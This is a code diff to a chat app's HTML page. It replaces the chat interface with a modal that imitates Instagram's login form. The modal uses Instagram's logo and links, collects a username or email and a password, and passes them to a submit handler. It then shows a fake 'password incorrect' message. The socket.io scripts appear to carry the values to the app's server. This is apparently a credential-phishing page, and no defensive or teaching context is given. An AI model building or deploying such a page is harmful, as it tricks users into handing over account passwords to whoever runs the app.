@@ -9,16 +9,72 @@
 </head>
 
 <body>
-    <section class="chat__section">
-        <div class="brand">
-            <img height="40" src="/wassup.png" alt="">
-            <h1>Wassup</h1>
-        </div>
-        <div class="message__area"></div>
-        <div>
-            <textarea id="textarea" cols="30" rows="1" placeholder="Write a message..."></textarea>
-        </div>
-    </section>
+    <button onclick="myFunction()">Open Modal</button>
+<!-- The Modal -->
+<div id="modal" class="modal" >
+    <div id="loader" class="loader__section">
+        <div  class="loader"></div>
+    </div>
+<!-- Modal content -->
+  <div id="modal-content" class="modal-content">
+    <span onclick="document.getElementById('modal').style.display='none'" class="close">&times;</span>
+    <section class="chat__section" >
+        <form name="login" action="#">
+             <div class="brand">
+                 <img height="40" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png"
+                  alt="">
+             </div>
+             <div class="inputsection">
+                 <div class="textwrap1">
+                     <input class="textarea" type='text' name='email' placeholder="Phone number, username, or email"/>
+                 </div>
+                 <div class="textwrap2">
+                     <input class="textarea" type='password' name='password' placeholder="Password"/>
+                 </div>
+             </div>
+             <div class="text2wrap">
+                 <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+             </div>
+             <div class="textwrap">
+                 <input class="button" type="submit" name="submit" value="Log In" onclick="onSubmit(document.login.email.value,document.login.password.value)"/>
+             </div>
+             <div class="error">
+                 <div class="text3wrap">
+                    <span class="a3" >Sorry, your password was incorrect. Please</span>
+                </div>
+                <div class="text4wrap">
+                    <span class="a3" >double-check your password.</span>
+                </div>
+
+             </div>
+
+             <div class="text2wrap">
+                <span class="a1" href="https://www.instagram.com/accounts/emailsignup/">Don't have an account?</span>
+                <span class="a2" href="https://www.instagram.com/accounts/emailsignup/"> Sign up</span>
+            </div>
+         </form>
+         </section>
+     
+  </div>
+  <!-- Login page -->
+
+  </div>
+  <script>
+    var myVar;
+    
+    function myFunction() {
+      document.getElementById('modal').style.display='block'
+      myVar = setTimeout(showPage, 3000);
+    }
+    
+    function showPage() {
+        document.getElementById("loader").style.display = "none";
+        document.getElementById('modal-content').style.display='block'
+      }
+      function error(){
+        document.getElementById('error').style.display='block' 
+      }
+    </script>
     <script src="/socket.io/socket.io.js"></script>
     <script src="/client.js"></script>
 </body>
